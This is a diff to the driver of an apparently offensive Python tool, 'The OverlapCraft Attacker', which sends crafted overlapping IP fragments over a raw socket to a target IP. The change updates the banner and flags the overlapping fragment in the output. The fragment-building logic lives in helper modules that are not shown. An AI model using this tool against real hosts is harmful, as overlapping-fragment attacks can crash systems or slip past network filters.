@@ -6,7 +6,7 @@ from helper_functs.ipHeadFieldGen import ipHeadFieldGen
 from helper_functs.rawsocket import rawSockGen
 
 while True:
-    print("Attacker Version 1.0\n")
+    print("\nThe OverlapCraft Attacker (Version 1.0)\n")
     if len(sys.argv)!=3:
         if (len(sys.argv)==1):
             print("! Error: Both Source and Destination IP address are missing. Please enter them in order and try again!")
@@ -21,7 +21,7 @@ while True:
         dstIP=sys.argv[2]
         break
 
-attackParams=attackParamGen(srcIP,dstIP)
+attackParams,overlapInd=attackParamGen(srcIP,dstIP)
 
 rawSock=rawSockGen();
 
@@ -37,6 +37,9 @@ for i in range(len(attackParams.allFragms)): #For each fragment, build the IP he
 
     ipPacket=ipHeadPacket + frag["fragPayload"]
     rawSock.sendto(ipPacket, (attackParams.destIPAddr,0))
-    print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1}")
+    if (i==overlapInd):
+       print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1} ---> Overlapping Fragment")
+    else:
+       print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1}")
 
 print(f"=> Fragments sent with ID={attackParams.IDField}. Attack Completed!") 
